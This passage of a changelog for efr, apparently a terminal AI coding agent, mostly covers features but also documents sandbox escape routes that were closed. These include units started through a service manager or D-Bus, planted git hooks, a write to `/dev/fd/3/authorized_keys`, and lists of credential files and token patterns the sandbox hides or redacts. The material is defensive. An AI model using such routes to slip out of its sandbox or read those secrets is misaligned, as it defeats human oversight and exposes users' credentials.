  could reach it. Such a command now fails to start, and the sandbox says why.
- In `auto`, the socket of a service manager, such as
  `$XDG_RUNTIME_DIR/systemd/private`, is a privilege exit that only you approve, as a
  container engine's socket is: a command with it could start a unit outside the
  sandbox.
- `~/.local/share/dbus-1` is now a floor: a sandboxed command cannot write it, and a
  write there asks you. The bus starts the program of a service file there outside the
  sandbox when a client calls its name.
- The git guard now also checks the git dirs below a dir that an approved write
  opened, also through a link, and the git dir of a repository when the write opened a
  dir in it, such as `.git/hooks`. Before, a command that you allowed to write to a
  repository that is not a project could plant git hooks there.
- The hooks and config of a git submodule (`.git/modules/<name>`, also a name with `/`
  such as `vendor/foo`, and a submodule of a submodule) stay read-only in the sandbox,
  as the project's own do. Before, only the first level below `.git/modules` was
  read-only. A relative `core.hooksPath` of a submodule is now read-only in the
  submodule's own dir. After each command, the git guard also checks these
  submodules, the git dir that a `.git` file names, and the include files and the
  `core.hooksPath` dir that the config of each checked repository names.
- A program whose modification time (mtime) a command set back still counts as
  changed in the turn: efr also reads its change time (ctime). A program that a
  background job of the conversation wrote since the previous turn started counts as
  changed too.
- efr now also treats `~/.config/git/credentials`, `~/.config/npm/npmrc`,
  `~/.config/pnpm/rc`, `~/.config/pypoetry/auth.toml` and
  `~/.config/composer/auth.json`, and hub's `~/.config/hub`, Copilot's
  `~/.config/github-copilot` and Git Credential Manager's `~/.gcm`, as secrets, as it
  treats `~/.git-credentials` and `~/.npmrc`. No mode reads them. The sandbox also
  hides `~/.config/glab-cli`, `~/.yarnrc.yml`, `~/.yarnrc`, `~/.bunfig.toml`,
  `~/.config/pip/pip.conf` and `~/.pip/pip.conf`, because they can hold a token. In
  `auto`, `read_file` of one of them asks you.
- A sandboxed command no longer gets `GIT_CONFIG_PARAMETERS`, `GIT_CONFIG_COUNT`,
  `GIT_CONFIG_KEY_*` or `GIT_CONFIG_VALUE_*`, which can give git a token or a
  credential helper. It also no longer gets a name that ends in `_AUTH`, such as
  `npm_config__auth`, or a variable whose value is a URL with a password, such as
  `PIP_INDEX_URL=https://user:token@...`, unless `sandbox.env_keep` keeps it.
- efr redacts more kinds of tokens from the last command and the recent commands that
  go to the model: AWS, Slack, GitLab, Google, npm, Hugging Face and PyPI keys, JSON
  web tokens, and long random words of upper and lower case letters and digits. Git
  ids, sha256 sums and paths stay. A key of only lower case hex stays visible.
- efr now uses rustls 0.23.46 for its connections to the provider. This version fixes
  four advisories of rustls 0.23.45 (RUSTSEC-2026-0346 to RUSTSEC-2026-0349).
- efr now uses rustls-webpki 0.103.16, which rustls uses to check certificates. This
  version fixes the advisory RUSTSEC-2026-0382 of rustls-webpki 0.103.15.

## [0.0.3] - 2026-10-09

### Added

- Model calls to OpenAI can go over a WebSocket, which cuts the time to the first
  token. Each conversation keeps one connection open between the calls of a turn and
  between turns, and closes it after 10 minutes without a call. Before a call on a
  connection that had no call for 30 seconds, efr sends a ping. When the connection
  died during a sleep of the computer or a change of network, the call goes over HTTP
  after at most 5 seconds. While the connection holds the previous answer, a call
  sends only its new input. A call that the server did not take on the WebSocket goes
  over HTTP. An error answer on the WebSocket, such as a rate limit or a context
  overflow, fails the call as it does over HTTP, without a second request. A call
  whose request went out and whose connection then broke or went silent fails as on
  HTTP and does not go out again, because the model may already run. When you
  interrupt a turn, efr stops the answer on the connection and keeps the connection
  for the next call. The new key `[openai] websocket` chooses the transport: `auto`
  (the default) uses a WebSocket for each model that the model catalog marks with
  `prefer_websockets` and HTTP for the other models, so a new catalog from the backend
  changes the choice from the next call. `on` uses it for every model, and `off` uses
  HTTP only. The key needs a restart of efrd. The debug log shows the time to the
  first event of each call with its transport (`phase=provider_accepted` and
  `phase=provider_first_event`), so you can compare the two.
- The model edits files with a new `apply_patch` tool. One patch adds, changes,
  deletes or moves one or more files, and it changes all of them or none: when a part
  does not match, the model gets the nearest lines of the file and no file changes.
  When you interrupt the turn while the patch writes, efr puts every file back.
  The call shows the diff of each file. A change or a new file in the turn's project
  or in `$SCRATCH` needs no approval, as for `write_file`. A delete or a move always
  asks, also in `auto`, because undo cannot bring the file back yet. The question
  shows the diff of every file and marks each delete and move. The models that take
  freeform tools get the tool with its grammar. When you change to a model that does
  not take freeform tools, the earlier calls go to it in the form that it takes. The
  system prompt tells the model to use it, and not `sed -i` or a whole-file write,
  for an edit.
- `efr` shows an `apply_patch` call by its files, such as `apply_patch src/a.rs +3 −1,
  new notes.md +2, delete old.rs`, and never the text of the patch. After the call,
  each file gets its own diff block with a row that names it, and
  `render.diff_lines` applies to each file. The approval of a patch shows the diff of
  every file, and marks a delete or a move in the warning colour. A file outside the
  project, `$SCRATCH` and your home keeps its absolute path, such as `/etc/hosts`.
  While the model writes the patch, the status row shows `preparing apply_patch,
  3.2 KB`.
- An input row below a running turn, in the terminal that follows it. Type there while
  the turn runs: Enter steers the turn, Tab queues the text as a prompt behind it, Esc
  interrupts it and Alt+Up takes back the newest prompt that you queued there. The row
  edits like a shell line (arrows, Home, End, Ctrl+A/E/U/W/K, Alt+B/F), Ctrl+J adds a
  newline, and a paste keeps its newlines. Keys that you type while the prompt goes
  out land in the row too. An approval takes only the keys that you type after it
  shows: keys typed before it and the rest of a paste stay in the row. While the
  output of a command ends with a password prompt, the row hides, and what you type
  never goes to the model as a steer. A complete output line that only names a
  password, as `grep password` prints, does not hide the row.
  `render.turn_input = false` turns the row off.
- Steers that the model did not read yet show above the status row as `↳ steer:`, and
  prompts that you queued as `↳ queued:`. When a model call reads a steer, it moves
  into the reply as your message. A steer that comes too late for its turn waits in
  the queue instead.
- `efr` follows each prompt that you queue from the input row after the turn before
  it, and ends after the last one. Esc sends the steers that the model did not read as
  a new prompt, and puts the prompts that you queued back into the row, so nothing
  runs that you did not see. Esc stops the turn also when the queue is full or when
  the settings of your terminal do not work now: the steers then go with the settings
  of the stopped turn. Ctrl+C clears the row; on an empty row it interrupts the
  turn and also takes back the prompts that you queued there and the steers that the
  model did not read. A prompt that still waits behind another turn is taken back
  instead, by Esc and by Ctrl+C. When efrd does not answer Ctrl+C in time, or the
  connection ends, all of that text goes back to your shell with a note, so no text
  is lost.
- Text that is still in the input row when `efr` ends goes back to your zsh command
  line as `, <text>`, so you can edit it and send it again. Without the zsh plugin,
  `efr` shows it as one muted line. Each `efr` run gets a file of its own, so the
  texts of two runs before the next prompt both come back, also from a pipeline or
  after you source the plugin again. A new shell removes only the files of gone
  shells in its own pid namespace, so a shell in a container (distrobox, toolbox)
  keeps its text.
- When efrd restarts while `efr` follows a turn with the input row, `efr` connects
  again. Prompts that you queued and steers that the model did not read come back to
  your command line when the restart cancelled them. A steer or a prompt whose answer
  the restart lost is not sent twice. When efrd does not come back, they come back
  too. SIGTERM and SIGHUP end `efr` at once also while it connects again.
- The diff of each file write shows in its call block, in the diff colours: the first
  `render.diff_lines` lines (default 20), then a muted `… N more lines`. This works in
  every directory.
- A shell call that changed files gets one muted row under its result, such as
  `changed src/a.rs +3 −1 · deleted old.rs · new notes.md (+2 more)`. A turn that
  changed files gets a muted line such as `3 files changed, +24 −7` before its end.
  This works in registered projects (git or not) and in `$SCRATCH`. The row and the
  line show what changed while the call or the turn ran, also a file that another
  conversation or your editor saved at the same time.
- `efr diff` prints what a turn changed: by default the last turn of this terminal's
  conversation, `--turn <id>` for another, `--stat` for the list of files. In a pipe it
  writes the plain diff. An ignored file such as `.env` shows in the list, but its
  content stays out of the diff.
- efr's own snapshot store: one bare git repository per registered project or
  `$SCRATCH` below the data directory. It never writes the project's `.git` or index.
  The `[snapshot]` table sets it (`snapshot.enabled`, size limits, `keep_turns`,
  `max_age_days`).
- efrd has the parts that the input row of a turn needs. A steer that comes too late
  for the running turn can become a queued prompt (`turn.steer` with `if_late`). You
  can take back a prompt that waits in the queue before it starts (`prompt.withdraw`).
  An interrupt can take back the queued prompts of one terminal and send its unread
  steers again as one new prompt, which runs next with the settings of that terminal.
  An interrupt can also take back unread steers, so that no model call reads them
  (`steering_withdrawn`). efrd records when a model call reads a steer
  (`steering_delivered`). `efr history` shows a prompt that you took back as
  `withdrawn before it ran`, and steers that you took back as `took back a steer that
  the model did not read`.
- efrd sends the conversation id as the prompt cache key of every model request, and
  on the subscription also as the `session-id` header, as Codex does. The requests of
  one conversation then go to the same prompt cache.
- `turn_completed`, `turn_failed` and `turn_interrupted` say how full the model's
  context is (`context`: the tokens, the point where efrd compacts and the window).
  Their `usage` also gives the cached input tokens, the reasoning tokens and the
  context of the last model call (`context_tokens`). A client that follows a turn gets
  a `context` draft before and after each model call.
- An entry of `[openai] models` can be a table that gives the model's limits:
  `{ id = "gpt-next", context_window = 400000, max_output_tokens = 128000 }`. An
  entry can also name a built-in model to change its limits. `models.list` shows the
  context window of each model that efr knows. On an API key, a model's own output
  limit wins over `[model] max_output_tokens`.
- efr compacts the context of a conversation before it fills the model's window. When
  a request reaches `[compaction] auto_at` percent of the window (76 by default),
  efrd first gives old tool outputs a short stub, when that frees at least 20000
  tokens. When that is not enough, the conversation's own model writes a summary with
  fixed sections: the task and its state, the decisions, the important details, the
  files and places, the open work and the next step, the directories and the shell,
  and the open system tasks. The next requests send a fresh block that efrd reads from
  disk (your directory, the hidden shell's directory and its jobs, the git status and
  the `AGENTS.md` files from the project root down), the summary, and the newest
  messages word for word, about 20000 tokens. The turn goes on after the compaction.
  `[compaction] auto = false` turns it off. All events stay in the log. The history
  keeps every earlier turn that the model's window can hold, so the compaction makes
  room, not a limit of turns or bytes. A summary that the model cuts off at its output
  limit never replaces the history. When the history does not fit in the summary
  request, its oldest messages go, and the summary, the compaction's line and the log
  say how many.
- `efr` shows how full the model's context is. The status row of a running turn, and
  the line of a running command, end with `ctx 43%`, and the end-of-turn line reads
  `done in 42s, ctx 43% (89k/206k), 1.1k out`. 100% is the point where efr compacts
  the context. The field is green below 50%, yellow from 50% and red from 90%, in the
  colours of your theme. While efr compacts the context, the status row says
  `compacting context`. Each compaction leaves one dim line, such as `context
  compacted (auto): 231k -> 24k tokens, kept 3 turns, summary 3.2k`, or a line that
  says that the context is full and what to do. `efr history` shows the same line at
  the place of each compaction, and `--verbose` adds the summary. A client that
  attaches while a turn runs shows the field at once.
- `efr compact [focus]` and `,compact [focus]` compact the context of a conversation
  now, between turns: efr writes a summary of the earlier turns and keeps the newest
  turns word for word. The focus says what the summary must keep. It starts no turn,
  and a prompt that you send meanwhile waits for it. While a turn runs, efr refuses
  it. A retry of the same command waits for the compaction that runs. The plugin
  hands the focus to `efr` in its environment, as it does a prompt.
- efr knows the current OpenAI models (gpt-6.1-sol first) with their windows and
  efforts, from a table built into efr. efrd also asks the ChatGPT backend for its
  model list in the background, at start, after `efr login openai` and then every
  hour, with efr's own version. Today the backend lists its models only for Codex
  versions, so the built-in table stays in use. A prompt never waits for this
  request. When the backend sends a list that efr can use, it applies from the next
  turn on, and efrd keeps it in its state directory
  (`~/.local/state/efr/model_catalog.json` by default) for a start without network.
  Models that the backend hides, or whose tools efr cannot send, are not offered.
- `efr models` shows the context window of each model and the largest window that
  `[openai] models` can set, such as `gpt-6.1-sol  272k (up to 872k)`, and a last line
  that says where the list came from: `models: from the backend, fetched 5m ago`,
  `from the cache, fetched 2h 5m ago` or `built into efr`. `efr status` shows the same
  as its `models` line.
- A `context_window` in `[openai] models` can raise or lower the window of a model of
  the list, up to its largest window. Above that, efrd uses the largest window and
  warns once in its log, and `efr config check` adds a note.
- The token counts of a turn on the protocol now include the input tokens that the
  provider wrote to its prompt cache: `cache_write_tokens`, and
  `cache_write_1h_tokens` for the part that it keeps for an hour. efr reads OpenAI's
  count of cache writes. Like `cached_input_tokens`, both are parts of
  `input_tokens`.
- The end-of-turn line shows the part of the turn's input that the provider's prompt
  cache served, such as `done in 42s, ctx 43% (89k/207k), 1.1k out, cache 91%`. A
  cache write counts as a miss. The line shows it only when the turn's input is 2048
  tokens or more, because a smaller input never makes a cache entry.
- Claude models with an Anthropic API key, provider `anthropic-api`. Log in with
  `efr login anthropic`, set `[model] provider = "anthropic-api"` and restart efrd.
  efrd streams Anthropic's Messages API, sends the signed thinking of each answer back
  unchanged, and sends an effort to each model that takes one: `medium` unless you
  set another. A new `[anthropic]` table has `base_url`, `models`, `cache_ttl` and
  `workspace_id` (for a key that is not scoped to one workspace). `cache_ttl = "auto"`, the default, keeps
  everything in the prompt cache for an hour, because an entry for one hour cannot
  build on an entry for five minutes; `5m` keeps everything for five minutes.
- The debug log of efrd gives each model call the time since the start of the
  conversation's call before, as `gap_ms`. Each request to Claude also writes one line
  with its prompt cache markers and their times, such as `cache_ttl=auto
  markers=S1h,A1h,P1h,T1h`. With the token counts of the turns, these lines show which
  `[anthropic] cache_ttl` costs less.
- efr has no built-in list of Claude models. The models, their windows, their output
  limits and their efforts come from the API's model list, which efrd fetches at
  start, after a login and every hour, and keeps in `anthropic_model_catalog.json` in
  its state directory. Until efrd has a list, a prompt waits for one fetch. The
  default model is `claude-opus-5-5`. Without a key, a turn fails and says to log in.
- `efr models` and `efr status` name the provider of the model list, such as
  `models: anthropic-api, from the backend, fetched 5m ago`, and say when efrd has no
  list yet. `efr config check` also notes a window of `[anthropic] models` above the
  largest window of its model.
- A new `edit` tool for Claude models. It replaces the exact text `old_string` of one
  file with `new_string`, once, or at every match with `replace_all`. When the text
  occurs more than once without `replace_all`, or does not occur, no file changes and
  the model gets the count or the nearest lines of the file. In a file with Windows
  line ends, the model's line breaks match them. A request offers a model either
  `apply_patch` (OpenAI models) or `edit` (Claude models), never both, and a call of
  the other one does not run. An edit needs approval where a `write_file` of the same
  file does. The question shows the diff of the file, and `efr` shows the call as
  `edit <path>`.
- Logins with an API key: `efr login openai-api` and `efr login anthropic` (also
  `anthropic-api`). efr reads the key at a prompt that does not show it when stdin is
  a terminal, else from stdin, or with `--from-env` from `OPENAI_API_KEY` or
  `ANTHROPIC_API_KEY` of your shell. It never takes the key as an argument. efrd
  checks the key with one request that runs no model, `--no-check` skips the check,
  and then efrd keeps the key in its `secrets/` directory. A login does not change
  the provider of new conversations: efr says how to set `[model] provider` and that
  efrd needs a restart.
- `efr logout <provider>` forgets the login of `openai`, `openai-api` or `anthropic`.
  A key stays valid at its provider; efr says where to revoke it.
- `efr status` lists every provider (`openai-subscription`, `openai-api` and
  `anthropic-api`), shows the start and the last four characters of each stored key,
  such as `sk-ant-...a1b2`, and marks the provider of new conversations with
  `(active)`. Its line about a missing login names the login of that provider.
- `efr logout` of the provider of new conversations warns on stderr: the provider
  stays in `[model] provider`, so its turns fail until you log in again. A logout
  records `logout_completed` in the event log, with the provider and nothing of the
  key. The answer of `admin.logout` has a new `active` member.
- `efr status` shows when a provider refused its stored API key, such as `key
  sk-ant-...a1b2 refused at 2026-10-09T12:03:00Z (5m 0s ago)`, after a 401 on a model
  call or on the fetch of the model list. The mark goes away when a request of the
  same kind with the key works again, or after a new login or a logout. After a model
  call that worked, a refused fetch of the model list does not show, so a key whose
  scopes allow one endpoint and not the other does not flip the mark each hour. For
  the active provider, a line
  on stderr says that its turns fail and how to log in. A provider in the answer of
  `admin.status` has a new `key_refused_at` member.
- After `efr login openai-api` and after `efr config set model.provider openai-api`,
  one line says that OpenAI bills the API key per token, apart from a ChatGPT plan.
- A `[model] name` of another company than `[model] provider`, such as `gpt-5.5` with
  `anthropic-api`: `efr config check` warns about it with the fix, efrd logs a
  warning at start and after each reload, and a prompt that names no model of its own
  fails at once with the cause and the fix (set `[model] name` to a model of the
  provider, or remove it). An id in the config's list of models of the provider's
  company is not of another company.
- When efrd has no list of Claude models at the start of a turn, the prompt now fails
  with the cause instead of a turn that says that the provider does not serve the
  model. Without a stored key, it says `log in with efr login anthropic`. After a
  failed fetch, it says `efr could not fetch Claude's model list` and why, such as the
  API's message for a refused key. A model whose output limit the config gives still
  runs without a list.
- New keys `[openai] organization` and `[openai] project`, sent as the
  `OpenAI-Organization` and `OpenAI-Project` headers of every request with an API
  key. Both need a restart of efrd.
- A new page, `docs/providers.md`, tells how to log in with an API key, how to change
  the provider, which settings the Claude models have (`[anthropic] cache_ttl` and what
  `auto` does, the workspace id, a smaller window), and what makes the prompt cache
  miss.
- Do not put an API key in the environment of the efrd service: efrd does not read
  it, and it gives its environment to the hidden shells, where a command of the agent
  can read it outside the `auto` sandbox. `docs/providers.md` says more.

### Changed

- Each request to the model now starts with the request before it and its answer, so
  the provider's prompt cache reads the earlier turns again and a long conversation
  costs less. The prompts of earlier turns keep their `<live_state>` block, and the
  system prompt tells the model that only the newest block is current. efr keeps the
  exact messages of every turn since the last summary, not of the newest 50 turns
  only, and a conversation of more than 4096 events no longer leaves out its oldest
  turns. Before, each turn changed the prompt of the turn before it, and from the 51st
  turn on each turn also changed the oldest turn.
- When the history would leave out a turn, such as after a change to a model with a
  smaller window, the turn compacts first, also below `[compaction] auto_at`. Before,
  the history left out one more turn at each turn.
- The fresh context block of a compaction (your directories, the git status and the
  `AGENTS.md` files) is now part of its record, and `conversation_compacted` carries
  it as `fresh`. After a restart of efrd, a request sends the same block. Before, the
  next turn read the files again.
- The default system prompt tells the model to change files with the edit tool that
  it has, `apply_patch` or `edit`, not with `apply_patch` only.
- With an OpenAI API key, efrd asks the API for the ids of the models that the key
  can use, at start, after a login and every hour, and offers only those models of
  its built-in list. The efforts are the API's: no model offers `ultra`, and
  `medium` is the default effort of every model.
- An OpenAI answer of 429 for a used-up quota or a spend limit, such as
  `insufficient_quota`, now fails the turn at once. Before, efr sent the same request
  up to three more times.
- With an OpenAI API key (`openai-api`), a key that the server refuses now fails the
  turn at once, and the error shows the server's reason, such as an expired key or a
  missing scope. Before, efr sent the same key a second time and showed no reason.
- The default model is now the first model of the backend's list (gpt-6.1-sol today),
  not gpt-5.5, which the backend lists as its legacy model. `[model] name` still wins.
  The first id of `[openai] models` no longer picks the default model. The window,
  the efforts, the default effort and the tool form of each model come from the
  backend's list too. With an API key, the built-in list stands in, so a model that
  it does not hold needs an entry in `[openai] models`.
- When efrd cannot fetch the model list, it tries again after 15 seconds, then after
  30 seconds, 1 minute and 2 minutes, then every 5 minutes. A good fetch starts the
  waits over. Before, it waited 5 minutes each time, so after a start before the
  network was up, the list came late.

- A long command no longer leaves a short first word alone in its row (`cp \`). A row
  breaks at a space only when it is at least half full; else it breaks inside the word
  with `↩`.
- The hint of an empty input row starts one column after the cursor. Before, a block
  cursor stood on the first letter of the hint and seemed to cover it. efr does not
  change the cursor shape.
- The note `interrupted to send your message` now comes after the call that Esc
  stopped and after the end of the interrupted turn. Before, it came above the
  stopped call.
- `efr history` shows the lines of each turn together, and the turns in the order
  that they started. Before, it showed the events in the order that they came, so a
  prompt that you queued or sent again with Esc showed in the middle of the turn
  before it. A prompt that you took back shows where it was in the queue, with the
  note `withdrawn before it ran`.
- A call in `auto` costs less in a project with nested git repositories. The surface
  guard runs git only for a git config that changed since the last call, reads no
  `*.sample` hook, and lists directories faster. In a copy of efr's own repository, the
  guard went from 15 ms to 6 ms per call.
- When the model refuses a request as too large for its context window, efrd never
  sends that request again as a retry. It compacts the context once and sends the
  request again. Before each model call, efrd estimates the size of the request, and
  it never sends a request above 95% of the window. When the model refuses the request
  again, when auto compaction is off, or when the request stays above the cap, the turn
  fails with a message that names the cause, the size and the way out, such as `the
  context is still full after a compaction: the model refused about 281k of 272k
  tokens; run ,compact or start a new conversation`. When the compaction fails, the
  message also says why, such as `the compaction failed (the provider is rate limiting
  requests)`. After two compactions in a row that leave the context too full, efr
  stops compacting on its own and says so, also in the next turns, until the context
  is below the trigger again or you run `,compact`. Before, the turn failed with the
  provider's own message.
- When the history of a long conversation leaves out earlier turns, the model reads
  `3 earlier turns are omitted.` first, and efrd logs a warning. Before, the turns
  went without a trace.

### Fixed

- efrd no longer loses a steer at the end of a turn. Before, efrd accepted a steer
  that came after the last model call of the turn or after an interrupt request, and
  no model call read it. Now efrd never records such a steer. It refuses a steer from
  `,!` with a conflict, so you can send the text as a new prompt. A steer from the
  input row becomes a queued prompt.
- efrd now ends a turn before it tells the clients that the turn ended. Before, a
  steer or an interrupt that you sent just after you saw the end could go to the
  ended turn, and a prompt could wait behind it. Now efrd refuses the steer and the
  interrupt, and the prompt starts at once.
- Ctrl+C while the auto sandbox starts a call now stops the call, with
  status 130. Before, the call could fail with status 125 and the message "the sandbox
  could not start", and efrd checked the sandbox again for no reason. A Ctrl+C that
  came just before bwrap started was lost, and the command ran to its end.
- The sandbox launcher no longer hangs when Ctrl+C ends bwrap while bwrap starts the
  sandbox.
- Ctrl+\ (SIGQUIT) now stops a shell call of the auto mode, as Ctrl+C does. Before,
  the child shell of the call ignored it. A Ctrl+\ during the line stopped only the
  running command, and the rest of the line ran. A Ctrl+\ just before the line was
  lost, and the line ran.
- A `TRAPINT` or `TRAPQUIT` function no longer lets a line of the auto mode go on after
  Ctrl+C or Ctrl+\. Before, such a function of your shell, or one that an earlier call
  made, could catch the signal in the child shell of the call.
- A client that resumes `pty.attach` with `since_seq` now gets each new size that the
  PTY took while the client was away, as `resized` at its place in the output. Before,
  the recording did not keep sizes, so the client got the output only. The recording
  keeps the sizes now, and older recordings still read.
- The time that a new hidden shell takes to show its first prompt no longer counts
  against the `timeout_seconds` of a shell call. A slow `.zshrc` made short calls fail
  with "an earlier command is still running", although no command ran. The startup
  timeout (10 s) limits that wait now. When a new shell never shows a ready prompt,
  the model reads that no command ran in it yet.
- The hidden shell now follows you when you change directories between two prompts.
  Before, it stayed where the model left it, so the model worked in the old directory
  or used long paths. Now efrd moves the shell to your new directory before the turn
  starts. The shell keeps its variables. When you did not move, the shell stays where
  the model put it. While a command still runs in the shell, the shell stays, and the
  model reads where it is.
- The model now reads that you changed directories since the previous prompt, and
  whether its hidden shell moved with you. Before, a short follow-up such as `and
  here?` could go to the old directory.
- After a restart, the model reads each steer of an earlier turn at the place where
  it read the steer during that turn. Before, a turn without saved messages showed a
  steer where you typed it, and also showed steers that the model never read, such as
  a steer of a failed turn or a steer that you took back.
- A conversation that grew on a model with a large window now goes on with a model of
  a smaller window, such as a move from a Claude model (1M tokens) to an OpenAI model
  (272k tokens). The first turn on the new model compacts before its first call, and
  the summary request fits the new window: it first leaves out the newest messages,
  which stay after the summary word for word, and then the oldest messages. The
  summary says when it left out old messages. Before, efr sent the whole history in the
  summary request, and the provider refused it once as too large.
- When you change to a model with another edit tool, such as from a Claude model with
  `edit` to an OpenAI model with `apply_patch`, the new model reads the earlier calls of
  the other tool, and their results, as text. A call of a tool that efr no longer has
  shows as text too. Before, efr sent them as calls of a tool that the request did not
  offer, which a provider can refuse. The text is the same in every request, so the
  prompt cache still reads it. When you change back, the calls go in their own form
  again.
- After a switch of `[model] provider`, the first turn on the new model estimates its
  request. Before, it started from the context that the old model reported last, and
  when that count was above the cap of the new window, the turn failed as full.
- `,compact` right after a switch of `[model] provider` now uses the default model of
  the new provider. Before, it sent the summary request with the model of the newest
  turn, which the new provider does not serve, and the compaction failed.
- When the newest messages alone do not fit in the context, the error now says to
  start a new conversation. Before, it said to run `,compact`, which then answered
  that there was nothing to compact.
- On Claude, when the model calls a tool that the request does not offer next to a
  tool that it offers, in one answer, the next request of the turn keeps the thinking
  of that answer. Before, efr sent that answer without its thinking, and the Messages
  API can refuse such a request, so the turn failed.
- On Claude, a prompt after a turn that ended early now goes as a message of its own,
  as after an interrupt while a tool ran or after a model call that failed, and the
  new turn now gets its one-hour cache entry. Before, efr joined the prompt to the
  last message of that turn, and the new turn had no one-hour cache entry.
- Each `<live_state>` block now starts with the rule that only the newest block is
  current. Before, only the default system prompt said so, and a `[model]
  system_prompt` of your own lost the rule, so the model could read an old directory
  as the current one. Blocks that efr sent before keep their bytes.
- The first key that you type after a question or a password prompt appears no longer
  goes to the input row. Before, when efr read a key from the terminal at the moment
  the question appeared, efr could count that key twice, and then the next key, such
  as the first letter of a password, went to the row.

### Security

- The `<live_state>` block shows your last command with its secrets redacted: the
  value of an assignment to a name that looks like a secret, such as
  `export GITHUB_TOKEN=...` or `--api-key=...`, also inside the value of an option,
  such as `--env=API_TOKEN=...` or `--from-literal=password=...` (a count such as
  `--max-tokens=4096` or `TOKEN_COUNT=5` stays); each word in the form of a known key
  (`sk-ant-`, `sk-proj-`, `sk-`, `ghp_` and the other GitHub token forms); the password
  of a URL, such as `https://user:...@host`; the value of an `Authorization`,
  `Cookie` or other secret header, such as `-H 'Authorization: Bearer ...'`, without
  its scheme, where a header stands (a search pattern such as
  `grep "Authorization: Bearer"` stays); and the password option of the programs that
  take one, such as `mysql -p...`, `sshpass -p ...`, `docker login -p ...` and
  `curl -u user:...`, also among other short options in one word
  (`curl -su user:...`). efr now saves the block with the turn and sends it again with
  every later request, so a secret there would reach the disk and every request after
  it. The list of patterns cannot find every secret: a secret in another form stays in
  the command.

## [0.0.2] - 2026-10-08

The reply view is new: replies stream without lag, a status row shows what runs, and
tool calls and questions have a clear layout. This release also fixes two sandbox
bugs.

### Added

- Streaming drafts. efrd sends the text of a running turn to the reply view every
  16 ms, and never writes these drafts to the event log. A reply now reaches the
  screen about 7 ms after the model sends it (it was about 100 ms).
- A status row under the reply while a turn runs: a spinner, the state (waiting for
  the model, thinking with the title of the reasoning, writing, preparing a tool call,
  stalled, waiting for you) and the time. The clock stops while a question waits.
  `render.motion = false` turns the shimmer off.
- An end-of-turn line, such as `done in 24s, 18.2k tokens in, 1.1k out`
  (`render.turn_summary`).
- A progress indicator in the terminal tab during a turn (OSC 9;4), in Ghostty 1.2 or
  newer, kitty 0.47 or newer and Windows Terminal, but not in tmux, GNU screen or
  zellij (`render.progress`).
- Colour roles for every part of the view: text, muted, accent, heading, link, code,
  success, warning, error, quote and the diff roles. `[render.colors]` sets one role,
  and `render.palette` loads a theme file with a `[colors]` table and an optional
  `code_theme` (a `.tmTheme` file). The eggfriedrice.nvim colour scheme ships such a
  file as `extras/efr/eggfriedrice.toml`.
- `render.theme = "auto"` with `render.theme_dark` and `render.theme_light`. The zsh
  plugin asks the terminal for its background once and sets `EFR_TERMINAL_BG`.
- Character widths by grapheme cluster in Ghostty, so emoji and flags no longer shift
  the live zone.
- Debug log lines with the time of each step of a call (`phase=... elapsed_ms=...`).
  `docs/sandbox.md` tells how to read them.
- `CHANGELOG.md`, and release notes that come from it.

### Changed

- Tool calls are blocks: `· $ command` in the code colour, a muted `│` output tail
  while it runs, and a result row (`✓ 0.4s` or `✗ exit 3 · 2.0s`). A failed call keeps
  its last 3 output lines. A long command wraps at the width and is never cut.
- Questions are cards with a thin muted bar and a title such as
  `? allow outside the sandbox`. After the answer, a card gives its place to one line,
  `✓ allowed` or `✗ denied`, and the command shows only once.
- One blank line between blocks, and none inside a block.
- Markdown: no label above plain code blocks, a file name when the fence names one,
  inline code in the code colour, one heading colour, quotes in italic, and a rule of
  at most 40 columns.
- The default accent colour is yellow (ANSI slot 3).
- `sudo -k` (and `-K`, `--reset-timestamp`, `--remove-timestamp`) can stand beside the
  one command of a line that runs outside the sandbox.
- A failed call no longer says `(sandbox)` in its result; the end-of-turn note says
  that the turn ran in the sandbox.
- A question no longer says that its target exists. It still says when a target is a
  directory, because a write grant then opens all of it.
- The reply view no longer prints `answer sent` after a password answer.

### Fixed

- A redirect to `/dev/null` (and to the other nodes of the sandbox's own `/dev`) was a
  write exit in `auto`: the line asked you and then ran outside the sandbox with your
  full rights. It now runs in the sandbox with no question.
- A command line that wraps inside a word no longer looks like two words; such a cut
  is marked with `↩`.
- When stdout is not a terminal, a call's rows come after its question and answer, as
  on a terminal.
- The status row no longer shows the reasoning title of an earlier model call.
- Ctrl+C during a turn says how long the turn ran.
- The cursor always comes back, also after a signal.

### Security

- A path below `/dev/fd/<n>/` or `/dev/pts/<n>/` counted as a node of the sandbox's
  own `/dev`, so a write such as `echo x > /dev/fd/3/authorized_keys` could run with no
  question. Now only `/dev/fd/<n>` and `/dev/pts/<n>` themselves count; a path below
  them is a write exit that only you can allow.

## [0.0.1] - 2026-10-07

The first release, on the AUR as `efr-code` and `efr-code-bin`.

### Added

- efrd, a user daemon with an event log in SQLite, one hidden zsh for each
  conversation and a terminal screen model (libghostty-vt).
- The efr CLI and the zsh plugin: a line that starts with a comma goes to the agent,
  and the reply streams below it. Sticky agent mode, `,new`, `,!` to steer a running
  turn, and `,mode`, `,model` and `,effort` for each terminal.
- The OpenAI provider, with the ChatGPT subscription login (`efr login openai`) or an
  API key.
- The tools `shell`, `read_file`, `write_file` and the settings tool, with approval
  questions in the terminal.
- Answers to programs that wait for input, such as `sudo` and `pacman`, also behind a
  relay, with hidden input for passwords.
- Permission modes `manual`, `cautious` and `auto`, with rules in `config.toml`.
- The `auto` sandbox: each command runs in bubblewrap with Landlock and seccomp; it
  writes only in the project, `$SCRATCH`, a private `/tmp` and private caches, and every
  action that leaves the sandbox asks you. `efr sandbox check` and
  `efr sandbox explain`.
- `efr project add`, `efr project list` and `efr project remove`.
- Settings in `config.toml` with live reload, `efr config` commands and `efr paths`.
- The AUR packages `efr-code` and `efr-code-bin`.

[Unreleased]: https://github.com/eggfriedrice24/eggfriedrice.code/compare/v0.0.6...HEAD
[0.0.6]: https://github.com/eggfriedrice24/eggfriedrice.code/compare/v0.0.5...v0.0.6
[0.0.5]: https://github.com/eggfriedrice24/eggfriedrice.code/compare/v0.0.4...v0.0.5
[0.0.4]: https://github.com/eggfriedrice24/eggfriedrice.code/compare/v0.0.3...v0.0.4
[0.0.3]: https://github.com/eggfriedrice24/eggfriedrice.code/compare/v0.0.2...v0.0.3
[0.0.2]: https://github.com/eggfriedrice24/eggfriedrice.code/compare/v0.0.1...v0.0.2
[0.0.1]: https://github.com/eggfriedrice24/eggfriedrice.code/releases/tag/v0.0.1
